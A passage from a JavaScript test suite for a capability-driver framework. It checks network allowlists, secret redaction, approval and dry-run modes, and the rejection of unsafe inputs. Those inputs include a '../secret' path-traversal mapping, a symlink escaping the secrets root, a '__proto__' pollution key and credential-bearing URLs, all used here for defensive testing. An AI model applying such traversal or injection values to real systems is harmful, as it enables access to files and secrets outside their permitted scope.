        requestBytes: fromUtf8(stableJson({ url: 'https://user:pass@allowed.example/decide', method: 'POST' })),
      },
      policy: {
        allowLiveEffects: true,
        allowNetworkEffects: true,
        allowedOrigins: ['https://allowed.example'],
        allowedMethods: ['POST'],
      },
      mode: 'live',
    }), { code: 'ERR_CAPABILITY_NETWORK_TARGET_REQUIRED' });
    assert.throws(() => assertCapabilityPolicyAllows({
      manifest: { ...manifest, recoveryClass: EffectRecoveryClass.idempotent },
      hostRequest: {
        ...httpRequest(),
        requestBytes: fromUtf8(stableJson({ url: 'file:///tmp/world-host-capability.json', method: 'POST' })),
      },
      policy: {
        allowLiveEffects: true,
        allowNetworkEffects: true,
        allowedOrigins: ['null'],
        allowedMethods: ['POST'],
      },
      mode: 'live',
    }), { code: 'ERR_CAPABILITY_NETWORK_TARGET_REQUIRED' });
  });

  it('awaits asynchronous capability driver reports', async () => {
    const driver = defineCapabilityDriver({
      manifest: () => new FixtureAgentModelCapabilityDriver().manifest(),
      async preflight() {
        return { accepted: true, blockers: ['should-not-survive'] };
      },
      async dryRun() {
        return { wouldInvoke: true, proposedAction: { async: true } };
      },
      async shadow() {
        return { liveInvoked: true, schemaAccepted: true };
      },
      async resolve() {
        throw new Error('not used');
      },
    });

    assert.equal((await driver.preflight({}, modelRequest('goal=async'))).accepted, true);
    assert.equal((await driver.dryRun({}, modelRequest('goal=async'))).wouldInvoke, true);
    assert.equal((await driver.shadow({}, modelRequest('goal=async'), null)).schemaAccepted, true);
  });

  it('keeps secrets receiver-local and redacted', async () => {
    const env = new EnvSecretProvider({ API_TOKEN: 'fixture-token-value' });
    assert.equal(env.has('API_TOKEN'), true);
    assert.equal(env.describe('API_TOKEN').redacted, true);
    assert.equal(env.accessReport('API_TOKEN').valueRedacted, true);
    assert.equal(redactSecrets({ apiKey: 'fixture-token-value' }).apiKey, '[redacted]');
    assert.equal(redactSecrets({ message: 'sk-abcdefghijklmnop' }).message, '[redacted]');
    assert.equal(redactCapabilityDiagnostics({ diagnostics: { Authorization: 'Bearer fixture-token-value' } }).diagnostics.Authorization, '[redacted]');
    assert.deepEqual(redactCapabilityDiagnostics({ diagnostics: { 'sk-abcdefghijklmnop': true, safe: true } }).diagnostics, { safe: true });
    assert.deepEqual(redactCapabilityDiagnostics({ diagnostics: new Map([['Bearer fixture-token-value', true], ['safe', 'token=fixture-token-value']]) }).diagnostics, { safe: '[redacted]' });
    const redactedPrototypeKey = redactCapabilityDiagnostics(new Map([['__proto__', { polluted: true }]]));
    assert.equal(Object.getPrototypeOf(redactedPrototypeKey), Object.prototype);
    assert.equal(Object.hasOwn(redactedPrototypeKey, '__proto__'), true);
    assert.equal(redactedPrototypeKey.polluted, undefined);
    assert.deepEqual(redactedPrototypeKey.__proto__, { polluted: true });
    assert.equal(redactCapabilityDiagnostics({ message: 'sk-abcdefghijklmnop' }).message, '[redacted]');
    assert.throws(() => assertNoSecretValuePersisted({ value: ['sk', 'local-secret'].join('-') }), { code: 'ERR_SECRET_PERSISTED' });

    const secretBase = await mkdtemp(path.join(tmpdir(), 'world-host-secret-'));
    const root = path.join(secretBase, 'root');
    try {
      await mkdir(root);
      await writeFile(path.join(root, 'api-token'), 'fixture-file-value\n');
      const fileProvider = new FileSecretProvider({ root, mapping: { API_TOKEN: 'api-token' } });
      assert.equal(fileProvider.has('API_TOKEN'), true);
      assert.equal(fileProvider.has('MISSING'), false);
      assert.equal(await fileProvider.get('API_TOKEN'), 'fixture-file-value');
      assert.equal((await fileProvider.accessReport('API_TOKEN')).valueRedacted, true);
      assert.throws(() => assertRequiredSecretsAvailable(fileProvider, ['MISSING']), { code: 'ERR_SECRET_MISSING' });
      await assert.rejects(() => new FileSecretProvider({ root, mapping: { BAD: '../secret' } }).get('BAD'), { code: 'ERR_SECRET_FILE_PATH_INVALID' });
      const outsideSecret = path.join(secretBase, 'outside-secret');
      await writeFile(outsideSecret, 'outside-secret-value');
      await symlink(outsideSecret, path.join(root, 'linked-secret'));
      const linkedProvider = new FileSecretProvider({ root, mapping: { LINKED: 'linked-secret' } });
      assert.equal(linkedProvider.has('LINKED'), false);
      await assert.rejects(() => linkedProvider.get('LINKED'), { code: 'ERR_SECRET_FILE_PATH_INVALID' });
      await writeFile(path.join(root, 'empty-token'), '\n');
      const emptyProvider = new FileSecretProvider({ root, mapping: { EMPTY: 'empty-token' } });
      assert.equal(emptyProvider.has('EMPTY'), false);
      assert.equal((await emptyProvider.accessReport('EMPTY')).available, false);
      await assert.rejects(() => emptyProvider.get('EMPTY'), { code: 'ERR_SECRET_MISSING' });
      const emptySecretPreflight = new GenericHttpJsonCapabilityDriver({
        endpointUrl: 'https://allowed.example/decide',
        secretHeaders: { Authorization: 'EMPTY' },
        secretProvider: emptyProvider,
      }).preflight({
        policy: {
          allowLiveEffects: true,
          allowNetworkEffects: true,
          allowedOrigins: ['https://allowed.example'],
          allowedMethods: ['POST'],
        },
      }, httpRequest());
      assert.equal(emptySecretPreflight.accepted, false);
      assert.equal(emptySecretPreflight.blockers.includes('ERR_SECRET_MISSING'), true);
    } finally {
      await rm(secretBase, { recursive: true, force: true });
    }
  });

  it('derives live smoke idempotency headers from the configured key', async () => {
    const root = await mkdtemp(path.join(tmpdir(), 'world-host-live-smoke-'));
    try {
      const headerPath = path.join(root, 'idempotency-header.txt');
      const preload = path.join(root, 'mock-fetch.mjs');
      await writeFile(preload, `
        import { writeFileSync } from 'node:fs';
        globalThis.fetch = async (_url, init = {}) => {
          writeFileSync(process.env.WORLD_HOST_TEST_FETCH_HEADER_FILE, String(init.headers?.['Idempotency-Key'] ?? ''));
          const status = Number(process.env.WORLD_HOST_TEST_FETCH_STATUS ?? '200');
          return new Response(status === 200 ? '{}' : 'failed', {
            status,
            headers: { 'content-type': status === 200 ? 'application/json' : 'text/plain' },
          });
        };
      `);
      const endpointUrl = 'https://allowed.example/decide';
      const idempotencyKey = 'operator-selected-live-smoke-key';
      const config = path.join(root, 'config.json');
      await writeFile(config, JSON.stringify({ endpointUrl, idempotencyKey, body: { ok: true } }));
      const result = await runBunProcess([
        process.execPath,
        '--preload',
        preload,
        'scripts/run-live-capability-smoke.mjs',
        '--config',
        config,
        '--secret-provider',
        'env',
        '--allow-origin',
        'https://allowed.example',
        '--live',
      ], { env: { ...process.env, WORLD_HOST_LIVE_SMOKE: '1', WORLD_HOST_TEST_FETCH_HEADER_FILE: headerPath, WORLD_HOST_TEST_FETCH_STATUS: '200' } });
      assert.equal(result.code, 0, result.stderr || result.stdout);
      assert.equal(
        await Bun.file(headerPath).text(),
        `world:key:live-smoke:${createHash('sha256').update(fromUtf8(idempotencyKey)).digest('hex')}`,
      );
      const failingResult = await runBunProcess([
        process.execPath,
        '--preload',
        preload,
        'scripts/run-live-capability-smoke.mjs',
        '--config',
        config,
        '--secret-provider',
        'env',
        '--allow-origin',
        'https://allowed.example',
        '--live',
      ], { env: { ...process.env, WORLD_HOST_LIVE_SMOKE: '1', WORLD_HOST_TEST_FETCH_HEADER_FILE: headerPath, WORLD_HOST_TEST_FETCH_STATUS: '500' } });
      assert.notEqual(failingResult.code, 0);
      assert.match(failingResult.stderr, /ERR_LIVE_SMOKE_HTTP_ERROR_RESOLUTION/);
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });

  it('runs fixture, dry-run, shadow, approval, and live modes without host-authored World evidence', async () => {
    const driver = new FixtureAgentModelCapabilityDriver();
    const request = modelRequest('goal=invoke', 'model-key');
    const fixture = await runCapabilityMode({ mode: 'fixture', driver, hostRequest: request });
    assert.equal(decodeResolutionInputBytes(fixture.resolutionInputBytes).status, 0);
    const fixtureWithDriverOverrides = await runCapabilityMode({ mode: 'fixture', driver: hostFieldOverrideFixtureDriver(), hostRequest: request });
    assert.equal(fixtureWithDriverOverrides.mode, 'fixture');
    assert.equal(fixtureWithDriverOverrides.submittedToWorld, true);
    const deniedFixturePackFingerprint = 'sha256:'.concat('3'.repeat(64));
    const deniedFixturePackDriver = localPolicyProbeDriver({ packFingerprint: deniedFixturePackFingerprint });
    await assert.rejects(
      () => runCapabilityMode({
        mode: 'fixture',
        driver: deniedFixturePackDriver,
        hostRequest: request,
        policy: { deniedCapabilityPacks: [deniedFixturePackFingerprint] },
      }),
      { code: 'ERR_CAPABILITY_PACK_DENIED' },
    );
    assert.equal(deniedFixturePackDriver.resolveCalled, false);
    assert.throws(
      () => assertCapabilityResolutionBoundary({ ...fixture, turnReceiptBytes: fromUtf8('receipt') }),
      { code: 'ERR_CAPABILITY_WORLD_EVIDENCE_FORBIDDEN' },
    );
    await assert.rejects(
      () => runCapabilityMode({ mode: 'fixture', driver: wrongTargetFixtureDriver(), hostRequest: request }),
      { code: 'ERR_EFFECT_RESOLUTION_TARGET_MISMATCH' },
    );
    await assert.rejects(
      () => runCapabilityMode({
        mode: 'fixture',
        driver,
        hostRequest: { ...request, actuatorRef: 'http:json' },
      }),
      { code: 'ERR_ACTUATOR_REF_NOT_SUPPORTED' },
    );
    const uncoveredRequest = { ...request, actuatorRef: 'model:other' };
    await assert.rejects(
      () => runCapabilityMode({ mode: 'fixture', driver: hostFieldOverrideFixtureDriver(), hostRequest: uncoveredRequest }),
      { code: 'ERR_ACTUATOR_REF_NOT_SUPPORTED' },
    );
    await assert.rejects(
      () => runCapabilityMode({ mode: 'dry-run', driver: hostFieldOverrideFixtureDriver(), hostRequest: uncoveredRequest }),
      { code: 'ERR_ACTUATOR_REF_NOT_SUPPORTED' },
    );
    await assert.rejects(
      () => runCapabilityMode({ mode: 'shadow', driver: hostFieldOverrideFixtureDriver(), hostRequest: uncoveredRequest, recordedResolution: fromUtf8('recorded') }),
      { code: 'ERR_ACTUATOR_REF_NOT_SUPPORTED' },
    );
    await assert.rejects(
      () => runCapabilityMode({
        mode: 'approval',
        driver: hostFieldOverrideFixtureDriver(),
        hostRequest: uncoveredRequest,
        approval: () => ({ approved: true }),
      }),
      { code: 'ERR_ACTUATOR_REF_NOT_SUPPORTED' },
    );
    const dry = await runCapabilityMode({ mode: 'dry-run', driver, hostRequest: request });
    assert.equal(dry.submittedToWorld, false);
    const bestEffortDryRunDriver = bestEffortModelDriver();
    const bestEffortDryRun = await runCapabilityMode({ mode: 'dry-run', driver: bestEffortDryRunDriver, hostRequest: request });
    assert.equal(bestEffortDryRun.submittedToWorld, false);
    assert.equal(bestEffortDryRun.dryRun.proposedAction.driver, 'best-effort-model');
    assert.equal(bestEffortDryRunDriver.resolveCalled, false);
    const fileDryRunDriver = dryRunFileProbeDriver('/dry-run-root');
    const fileDryRun = await runCapabilityMode({ mode: 'dry-run', driver: fileDryRunDriver, hostRequest: fileRequest() });
    assert.equal(fileDryRun.submittedToWorld, false);
    assert.equal(fileDryRun.dryRun.proposedAction.path, 'out.txt');
    assert.equal(fileDryRunDriver.dryRunCalled, true);
    const deniedFileDryRunDriver = dryRunFileProbeDriver('/dry-run-root');
    await assert.rejects(
      () => runCapabilityMode({
        mode: 'dry-run',
        driver: deniedFileDryRunDriver,
        hostRequest: fileRequest(),
        policy: { allowedFileRoots: ['/other-root'] },
      }),
      { code: 'ERR_CAPABILITY_FILE_ROOT_DENIED' },
    );
    assert.equal(deniedFileDryRunDriver.dryRunCalled, false);
    const shadow = await runCapabilityMode({ mode: 'shadow', driver, hostRequest: request, recordedResolution: fromUtf8('recorded') });
    assert.equal(shadow.submittedToWorld, false);
    let fixtureLiveEffectResolveCalled = false;
    await assert.rejects(
      () => runCapabilityMode({
        mode: 'fixture',
        driver: deterministicLiveEffectDriver(() => {
          fixtureLiveEffectResolveCalled = true;
        }),
        hostRequest: httpRequest(),
      }),
      { code: 'ERR_CAPABILITY_FIXTURE_LIVE_EFFECT_DENIED' },
    );
    assert.equal(fixtureLiveEffectResolveCalled, false);
    let fixtureUnlabeledLiveEffectResolveCalled = false;
    await assert.rejects(
      () => runCapabilityMode({
        mode: 'fixture',
        driver: deterministicLiveEffectDriver(() => {
          fixtureUnlabeledLiveEffectResolveCalled = true;
        }, { authorityLabels: [] }),
        hostRequest: httpRequest(),
      }),
      { code: 'ERR_CAPABILITY_FIXTURE_LIVE_EFFECT_DENIED' },
    );
    assert.equal(fixtureUnlabeledLiveEffectResolveCalled, false);
    let fixtureModelLiveEffectResolveCalled = false;
    await assert.rejects(
      () => runCapabilityMode({
        mode: 'fixture',
        driver: deterministicModelLiveEffectDriver(() => {
          fixtureModelLiveEffectResolveCalled = true;
        }),
        hostRequest: genericHttpModelRequest('goal=fixture-model-live', 'model-fixture-live-key'),
      }),
      { code: 'ERR_CAPABILITY_FIXTURE_LIVE_EFFECT_DENIED' },
    );
    assert.equal(fixtureModelLiveEffectResolveCalled, false);
    let fixtureUnlabeledModelLiveEffectResolveCalled = false;
    await assert.rejects(
      () => runCapabilityMode({
        mode: 'fixture',
        driver: deterministicModelLiveEffectDriver(() => {
          fixtureUnlabeledModelLiveEffectResolveCalled = true;
        }, { authorityLabels: [], driverId: 'unlabeled-deterministic-model-http' }),
        hostRequest: genericHttpModelRequest('goal=fixture-unlabeled-model-live', 'model-fixture-unlabeled-live-key'),
      }),
      { code: 'ERR_CAPABILITY_FIXTURE_LIVE_EFFECT_DENIED' },
    );
    assert.equal(fixtureUnlabeledModelLiveEffectResolveCalled, false);
    await assert.rejects(
      () => runCapabilityMode({
        mode: 'dry-run',
        driver: worldEvidenceReportDriver({ dryRunReport: { wouldInvoke: false, proposedAction: { turnClosureBytes: fromUtf8('closure') } } }),
        hostRequest: request,
      }),
      { code: 'ERR_CAPABILITY_WORLD_EVIDENCE_FORBIDDEN' },
    );
    await assert.rejects(
      () => runCapabilityMode({
        mode: 'shadow',
        driver: worldEvidenceReportDriver({ shadowReport: { liveInvoked: false, schemaAccepted: false, diagnostics: { runHead: { generation: 1 } } } }),
        hostRequest: request,
        recordedResolution: fromUtf8('recorded'),
      }),
      { code: 'ERR_CAPABILITY_WORLD_EVIDENCE_FORBIDDEN' },
    );
    await assert.rejects(
      () => runCapabilityMode({
        mode: 'fixture',
        driver: worldEvidenceReportDriver({ preflightReport: { accepted: true, diagnostics: { turnClosureBytes: fromUtf8('closure') } } }),
        hostRequest: request,
      }),
      { code: 'ERR_CAPABILITY_WORLD_EVIDENCE_FORBIDDEN' },
    );
    const bytesWithEnumerableGetter = new Uint8Array([1, 2, 3]);
    Object.defineProperty(bytesWithEnumerableGetter, 'expensive', {
      enumerable: true,
      get() {
        throw new Error('byte arrays should be evidence-scan leaves');
      },
    });
    assert.equal(assertNoWorldEvidenceKeys({ bytesWithEnumerableGetter }), true);
    assert.throws(
      () => assertNoWorldEvidenceKeys({ diagnostics: new Map([['turnReceiptBytes', fromUtf8('receipt')]]) }),
      { code: 'ERR_CAPABILITY_WORLD_EVIDENCE_FORBIDDEN' },
    );
    assert.throws(
      () => assertNoWorldEvidenceKeys({ diagnostics: new Map([['nested', { boundaryModuleBytes: fromUtf8('module') }]]) }),
      { code: 'ERR_CAPABILITY_WORLD_EVIDENCE_FORBIDDEN' },
    );
    assert.throws(
      () => assertNoWorldEvidenceKeys({ diagnostics: new Set([{ runHead: { generation: 1 } }]) }),
      { code: 'ERR_CAPABILITY_WORLD_EVIDENCE_FORBIDDEN' },
    );
    const mapWithOwnEvidence = new Map();
    mapWithOwnEvidence.turnReceiptBytes = fromUtf8('receipt');
    assert.throws(
      () => assertNoWorldEvidenceKeys(mapWithOwnEvidence),
      { code: 'ERR_CAPABILITY_WORLD_EVIDENCE_FORBIDDEN' },
    );
    const setWithOwnEvidence = new Set();
    setWithOwnEvidence.boundaryModuleBytes = fromUtf8('module');
    assert.throws(
      () => assertNoWorldEvidenceKeys(setWithOwnEvidence),
      { code: 'ERR_CAPABILITY_WORLD_EVIDENCE_FORBIDDEN' },
    );

    const approved = await runCapabilityMode({
      mode: 'approval',
      driver,
      hostRequest: request,
      approval: () => ({ approved: true }),
    });
    assert.equal(approved.approved, true);
    assert.equal(approved.proposed.wouldInvoke, false);
    assertCapabilityResolutionBoundary(approved);
    const approvedWithDriverOverrides = await runCapabilityMode({
      mode: 'approval',
      driver: hostFieldOverrideFixtureDriver(),
      hostRequest: request,
      approval: () => ({ approved: true }),
    });
    assert.equal(approvedWithDriverOverrides.mode, 'approval');
    assert.equal(approvedWithDriverOverrides.submittedToWorld, true);
    assert.equal(approvedWithDriverOverrides.approved, true);
    assert.equal(approvedWithDriverOverrides.proposed.wouldInvoke, false);
    let approvalShortcutLiveEffectResolveCalled = false;
    await assert.rejects(
      () => runCapabilityMode({
        mode: 'approval',
        driver: deterministicLiveEffectDriver(() => {
          approvalShortcutLiveEffectResolveCalled = true;
        }, { authorityLabels: [], driverId: 'fixture-agent-model' }),
        hostRequest: httpRequest(),
        approval: () => ({ approved: true }),
      }),
      { code: 'ERR_CAPABILITY_FIXTURE_LIVE_EFFECT_DENIED' },
    );
    assert.equal(approvalShortcutLiveEffectResolveCalled, false);
    await assert.rejects(
      () => runCapabilityMode({
        mode: 'approval',
        driver: wrongTargetFixtureDriver(),
        hostRequest: request,
        approval: () => ({ approved: true }),
      }),
      { code: 'ERR_EFFECT_RESOLUTION_TARGET_MISMATCH' },
    );

    const store = new MemoryStore();
    const live = await runCapabilityMode({
      mode: 'live',
      driver,
      hostRequest: request,
      journalOptions: {
        store,
        runId: 'run',
        branchId: 'main',
        parentTurnClosureFingerprint: 'world:turn-closure:parent',
      },
      policy: { allowLiveEffects: true },
    });
    assert.equal(live.record.state, 'resolved');
    assert.equal(live.submittedToWorld, false);
    assert.equal(decodeResolutionInputBytes(live.resolutionInputBytes).status, 0);

    const parkedStore = new MemoryStore();
    const parkedJournal = new EffectJournal({
      store: parkedStore,
      runId: 'parked-run',
      branchId: 'main',
      parentTurnClosureFingerprint: 'world:turn-closure:parent',
      policy: { allowBestEffort: true },
    });
    const parkedRequest = {
      ...modelRequest('goal=parked', 'model-parked-key'),
      hostRequestFingerprint: 'world:host-request:00000000000000a8',
    };
    const observed = await parkedJournal.observe(parkedRequest, { recoveryClass: EffectRecoveryClass.bestEffort });
    await parkedStore.putEffectRecord({ ...observed, state: EffectState.running, attemptCount: 1 });
    const parkedDriver = bestEffortModelDriver();
    const parked = await runCapabilityMode({
      mode: 'live',
      driver: parkedDriver,
      hostRequest: parkedRequest,
      journalOptions: parkedJournal,
      policy: { allowLiveEffects: true, allowBestEffort: true, requireApprovalForBestEffort: false, maximumLiveModelCalls: 1 },
    });
    assert.equal(parked.operatorInterventionRequired, true);
    assert.equal(parked.submittedToWorld, false);
    assert.equal(parked.resolutionInputBytes, null);
    assert.equal(parkedDriver.resolveCalled, false);
  });

  it('supports generic HTTP JSON and human approval reference capabilities', async () => {
    assert.equal(ActuationClass.human, 'human');
    const originalFetch = globalThis.fetch;
    let observedHeaders = null;
    try {
      globalThis.fetch = async (url, options) => {
        observedHeaders = options.headers;
        return new Response('{"action":{"variant":"final","text":"ok"}}', {
          status: 200,
          headers: { 'x-request-id': 'request-1' },
        });
      };
      const driver = new GenericHttpJsonCapabilityDriver({
        endpointUrl: 'https://allowed.example/decide',
        secretHeaders: { Authorization: 'API_TOKEN' },
        secretProvider: new EnvSecretProvider({ API_TOKEN: 'Bearer fixture-token-value' }),
      });
      assert.deepEqual(driver.manifest().supportedResponseStatuses, ['ok', 'http_error', 'failed', 'deferred']);
      const packDriver = new HttpJsonPackCapabilityDriver({ endpointUrl: 'https://allowed.example/decide' });
      assert.deepEqual(packDriver.manifest().supportedResponseStatuses, ['ok', 'http_error', 'failed', 'deferred']);
      const renderingPackDriver = new HttpJsonPackCapabilityDriver({
        endpointUrl: 'https://allowed.example/decide',
        secretHeaders: { Authorization: 'API_TOKEN' },
        requestTemplate: { prompt: 'pack' },
        responseExtractionPath: 'action',
        idempotencyHeaderName: 'X-Idempotency-Key',
      });
      assert.equal(renderingPackDriver.manifest().diagnostics.configuredEndpointUrl, 'https://allowed.example/decide');
      assert.match(renderingPackDriver.manifest().diagnostics.requestRendering.requestTemplateFingerprint, /^sha256:[0-9a-f]{64}$/);
      assert.match(renderingPackDriver.manifest().diagnostics.requestRendering.secretHeadersFingerprint, /^sha256:[0-9a-f]{64}$/);
      assert.equal(renderingPackDriver.manifest().diagnostics.requestRendering.idempotencyHeaderName, 'X-Idempotency-Key');
      assert.match(renderingPackDriver.manifest().diagnostics.requestRendering.responseExtractionPathFingerprint, /^sha256:[0-9a-f]{64}$/);
      observedHeaders = null;
      await assert.rejects(
        () => packDriver.resolve({
          policy: { allowLiveEffects: true, allowNetworkEffects: true, allowedOrigins: ['https://allowed.example'], allowedMethods: ['POST'] },
        }, { ...httpRequest(), hostRequestFingerprint: undefined }),
        { code: 'ERR_HOST_REQUEST_FINGERPRINT_REQUIRED' },
      );
      assert.equal(observedHeaders, null);
      await assert.rejects(
        () => packDriver.resolve({
          policy: { allowLiveEffects: true, allowNetworkEffects: true, allowedOrigins: ['https://allowed.example'], allowedMethods: ['POST'] },
        }, { ...httpRequest(), idempotencyKeyWorldFingerprint: undefined }),
        { code: 'ERR_HTTP_IDEMPOTENCY_KEY_REQUIRED' },
      );
      assert.equal(observedHeaders, null);

      let packMalformedExplicitUrlFetchCalled = false;
      globalThis.fetch = async () => {
        packMalformedExplicitUrlFetchCalled = true;
        return new Response('{"status":"ok"}', { status: 200 });
      };
      await assert.rejects(
        () => new HttpJsonPackCapabilityDriver({
          endpointUrl: 'https://allowed.example/decide',
          allowEndpointFromRequest: true,
          origins: ['https://allowed.example'],
        }).resolve({
          policy: {
            allowLiveEffects: true,
            allowNetworkEffects: true,
            allowedOrigins: ['https://allowed.example'],
            allowedMethods: ['POST'],
          },
        }, {
          ...httpRequest(),
          requestBytes: fromUtf8(stableJson({ url: '', method: 'POST', body: { prompt: 'pack' } })),
        }),
        { code: 'ERR_HTTP_URL_INVALID' },
      );
      assert.equal(packMalformedExplicitUrlFetchCalled, false);

      let packPostResponseFailureFetchCount = 0;
      globalThis.fetch = async () => {
        packPostResponseFailureFetchCount += 1;
        return new Response('{not-json', {
          status: 200,
          headers: { 'x-request-id': 'pack-post-response-failure' },
        });
      };
      const packPostResponseFailure = await new HttpJsonPackCapabilityDriver({
          endpointUrl: 'https://allowed.example/decide',
          retryPolicy: { attempts: 2 },
        }).resolve({
          policy: {
            allowLiveEffects: true,
            allowNetworkEffects: true,
            allowedOrigins: ['https://allowed.example'],
            allowedMethods: ['POST'],
          },
        }, {
          ...httpRequest(),
          hostRequestFingerprint: 'world:host-request:00000000000000ae',
          idempotencyKeyBytes: fromUtf8('http-pack-post-response-failure'),
          idempotencyKeyWorldFingerprint: 'world:key:http-pack-post-response-failure',
        });
      assert.equal(decodeResolutionInputBytes(packPostResponseFailure.resolutionInputBytes).status, 2);
      assert.equal(packPostResponseFailure.diagnostics.status, 'failed');
      assert.equal(packPostResponseFailureFetchCount, 1);
      globalThis.fetch = async (url, options) => {
        observedHeaders = options.headers;
        return new Response('{"action":{"variant":"final","text":"ok"}}', {
          status: 200,
          headers: { 'x-request-id': 'request-1' },
        });
      };

      const runtimePackFingerprint = 'sha256:'.concat('4'.repeat(64));
      const pinnedPackDriver = defineCapabilityDriver(new HttpJsonPackCapabilityDriver({
        endpointUrl: 'https://allowed.example/decide',
        packFingerprint: runtimePackFingerprint,
      }));
      assert.equal(pinnedPackDriver.manifest().packFingerprint, runtimePackFingerprint);
      assert.throws(
        () => assertCapabilityPolicyAllows({
          manifest: pinnedPackDriver.manifest(),
          hostRequest: httpRequest(),
          policy: {
            allowLiveEffects: true,
            allowNetworkEffects: true,
            deniedCapabilityPacks: [runtimePackFingerprint],
            allowedOrigins: ['https://allowed.example'],
            allowedMethods: ['POST'],
          },
          mode: 'live',
        }),
        { code: 'ERR_CAPABILITY_PACK_DENIED' },
      );
      assert.equal(assertCapabilityPolicyAllows({
        manifest: pinnedPackDriver.manifest(),
        hostRequest: httpRequest(),
        policy: {
          allowLiveEffects: true,
          allowNetworkEffects: true,
          allowedCapabilityPacks: [runtimePackFingerprint],
          allowedOrigins: ['https://allowed.example'],
          allowedMethods: ['POST'],
        },
        mode: 'live',
      }), true);
      assert.throws(
        () => new HttpJsonPackCapabilityDriver({ endpointUrl: 'https://allowed.example/decide?api_key=secret' }),
        { code: 'ERR_HTTP_URL_CREDENTIALS_FORBIDDEN' },
      );
      assert.throws(
        () => new HttpJsonPackCapabilityDriver({ endpointUrl: 'https://allowed.example/decide?q=api_key=supersecret123' }),
        { code: 'ERR_HTTP_URL_CREDENTIALS_FORBIDDEN' },
      );
      assert.throws(
        () => new HttpJsonPackCapabilityDriver({ endpointUrl: 'https://allowed.example/sk-configured-secret123456/decide' }),
        { code: 'ERR_HTTP_URL_CREDENTIALS_FORBIDDEN' },
      );
      assert.throws(
        () => new GenericHttpJsonCapabilityDriver({ endpointUrl: 'https://allowed.example/token=secret-value/decide' }),
        { code: 'ERR_HTTP_URL_CREDENTIALS_FORBIDDEN' },
      );
      assert.throws(
        () => new HttpJsonPackCapabilityDriver({ endpointUrl: 'https://allowed.example/api_key:secret-value/decide' }),
        { code: 'ERR_HTTP_URL_CREDENTIALS_FORBIDDEN' },
      );
      assert.throws(
        () => new GenericHttpJsonCapabilityDriver({ endpointUrl: 'https://allowed.example/decide#token=secret-fragment-value' }),
        { code: 'ERR_HTTP_URL_CREDENTIALS_FORBIDDEN' },
      );
      const credentialQueryRequest = {
        ...httpRequest(),
        requestBytes: fromUtf8(stableJson({ url: 'https://allowed.example/decide?token=Bearer%20fixture-token-value', method: 'POST', body: { prompt: 'hi' } })),
      };
      assert.throws(
        () => new GenericHttpJsonCapabilityDriver({
          endpointUrl: 'https://allowed.example/decide',
          allowEndpointFromRequest: true,
          origins: ['https://allowed.example'],
        }).dryRun({}, credentialQueryRequest),
        { code: 'ERR_HTTP_URL_CREDENTIALS_FORBIDDEN' },
      );
      assert.throws(
        () => new HttpJsonPackCapabilityDriver({
          endpointUrl: 'https://allowed.example/decide',
          allowEndpointFromRequest: true,
          origins: ['https://allowed.example'],
        }).dryRun({}, credentialQueryRequest),
        { code: 'ERR_HTTP_URL_CREDENTIALS_FORBIDDEN' },
      );
      const credentialPathRequest = {
        ...httpRequest(),
        requestBytes: fromUtf8(stableJson({ url: 'https://allowed.example/token=secret-value/decide', method: 'POST', body: { prompt: 'hi' } })),
      };
      assert.throws(
        () => new GenericHttpJsonCapabilityDriver({
          endpointUrl: 'https://allowed.example/decide',
          allowEndpointFromRequest: true,
          origins: ['https://allowed.example'],
        }).dryRun({}, credentialPathRequest),
        { code: 'ERR_HTTP_URL_CREDENTIALS_FORBIDDEN' },
      );
      const result = await driver.resolve({
        policy: { allowLiveEffects: true, allowNetworkEffects: true, allowedOrigins: ['https://allowed.example'], allowedMethods: ['POST'] },
      }, httpRequest());
      assert.equal(observedHeaders.Authorization, 'Bearer fixture-token-value');
      assert.equal(JSON.stringify(result.diagnostics).includes('secret'), false);
      assert.equal(decodeResolutionInputBytes(result.resolutionInputBytes).status, 0);
      assert.equal(driver.dryRun({}, httpRequest()).wouldInvoke, true);
      const queryDryRunRequest = {
        ...httpRequest(),
        requestBytes: fromUtf8(stableJson({ url: 'https://allowed.example/decide?mode=delete', method: 'POST', body: { prompt: 'hi' } })),
      };
      assert.equal(new GenericHttpJsonCapabilityDriver({
        endpointUrl: 'https://allowed.example/decide',
        allowEndpointFromRequest: true,
        origins: ['https://allowed.example'],
      }).dryRun({}, queryDryRunRequest).proposedAction.url, 'https://allowed.example/decide?mode=delete');
      assert.equal(new HttpJsonPackCapabilityDriver({
        endpointUrl: 'https://allowed.example/decide?mode=delete',
      }).dryRun({}, httpRequest()).proposedAction.url, 'https://allowed.example/decide?mode=delete');

      globalThis.fetch = async () => new Response('{"action":{"variant":"final","text":"Bearer fixture-token-value"}}', {
        status: 200,
        headers: { 'x-request-id': 'request-secret-echo' },
      });
      const secretEcho = await new GenericHttpJsonCapabilityDriver({
          endpointUrl: 'https://allowed.example/decide',
          secretHeaders: { Authorization: 'API_TOKEN' },
          secretProvider: new EnvSecretProvider({ API_TOKEN: 'Bearer fixture-token-value' }),
        }).resolve({
          policy: { allowLiveEffects: true, allowNetworkEffects: true, allowedOrigins: ['https://allowed.example'], allowedMethods: ['POST'] },
        }, {
          ...httpRequest(),
          hostRequestFingerprint: 'world:host-request:00000000000000ab',
          idempotencyKeyBytes: fromUtf8('http-key-secret-echo'),
          idempotencyKeyWorldFingerprint: 'world:key:http-secret-echo',
        });
      assert.equal(decodeResolutionInputBytes(secretEcho.resolutionInputBytes).status, 2);
      assert.equal(secretEcho.diagnostics.failureCode, 'ERR_SECRET_PERSISTED');
      globalThis.fetch = async () => new Response('{"action":{"variant":"final","text":"ok"}}', {
        status: 200,
        headers: { 'x-request-id': 'Bearer fixture-token-value' },
      });
      const secretTransactionRef = await new GenericHttpJsonCapabilityDriver({
          endpointUrl: 'https://allowed.example/decide',
          secretHeaders: { Authorization: 'API_TOKEN' },
          secretProvider: new EnvSecretProvider({ API_TOKEN: 'Bearer fixture-token-value' }),
        }).resolve({
          policy: { allowLiveEffects: true, allowNetworkEffects: true, allowedOrigins: ['https://allowed.example'], allowedMethods: ['POST'] },
        }, {
          ...httpRequest(),
          hostRequestFingerprint: 'world:host-request:00000000000000ac',
          idempotencyKeyBytes: fromUtf8('http-key-secret-transaction-ref'),
          idempotencyKeyWorldFingerprint: 'world:key:http-secret-transaction-ref',
        });
      assert.equal(decodeResolutionInputBytes(secretTransactionRef.resolutionInputBytes).status, 2);
      assert.equal(secretTransactionRef.diagnostics.failureCode, 'ERR_SECRET_PERSISTED');
      assert.equal(secretTransactionRef.driverTransactionRef, null);

      let secretHasCalls = 0;
      let secretGetCalls = 0;
      const untouchedSecretProvider = {
        has() {
          secretHasCalls += 1;
          return true;
        },
        async get() {
